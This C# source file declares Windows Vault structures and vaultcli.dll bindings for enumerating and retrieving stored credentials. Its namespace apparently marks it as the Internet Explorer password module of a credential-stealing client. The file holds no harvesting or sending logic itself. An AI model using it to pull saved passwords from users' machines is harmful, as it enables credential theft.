using System;
using System.Runtime.InteropServices;

namespace Client.Modules.Passwords.Targets.Browsers.Internet_Explorer;

public static class VaultCli
{
	public enum VAULT_ELEMENT_TYPE
	{
		Undefined = -1,
		Boolean,
		Short,
		UnsignedShort,
		Int,
		UnsignedInt,
		Double,
		Guid,
		String,
		ByteArray,
		TimeStamp,
		ProtectedArray,
		Attribute,
		Sid,
		Last
	}

	public enum VAULT_SCHEMA_ELEMENT_ID
	{
		Illegal = 0,
		Resource = 1,
		Identity = 2,
		Authenticator = 3,
		Tag = 4,
		PackageSid = 5,
		AppStart = 100,
		AppEnd = 10000
	}

	public struct VAULT_ITEM_WIN8
	{
		public Guid SchemaId;

		public IntPtr pszCredentialFriendlyName;

		public IntPtr pResourceElement;

		public IntPtr pIdentityElement;

		public IntPtr pAuthenticatorElement;

		public IntPtr pPackageSid;

		public ulong LastModified;

		public uint dwFlags;

		public uint dwPropertiesCount;

		public IntPtr pPropertyElements;
	}

	public struct VAULT_ITEM_WIN7
	{
		public Guid SchemaId;

		public IntPtr pszCredentialFriendlyName;

		public IntPtr pResourceElement;

		public IntPtr pIdentityElement;

		public IntPtr pAuthenticatorElement;

		public ulong LastModified;

		public uint dwFlags;

		public uint dwPropertiesCount;

		public IntPtr pPropertyElements;
	}

	[StructLayout(LayoutKind.Explicit)]
	public struct VAULT_ITEM_ELEMENT
	{
		[FieldOffset(0)]
		public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

		[FieldOffset(8)]
		public VAULT_ELEMENT_TYPE Type;
	}

	[DllImport("vaultcli.dll")]
	public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

	[DllImport("vaultcli.dll")]
	public static extern int VaultCloseVault(ref IntPtr vaultHandle);

	[DllImport("vaultcli.dll")]
	public static extern int VaultFree(ref IntPtr vaultHandle);

	[DllImport("vaultcli.dll")]
	public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

	[DllImport("vaultcli.dll")]
	public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

	[DllImport("vaultcli.dll")]
	public static extern int VaultGetItem(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

	[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
	public static extern int VaultGetItem_1(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);
}
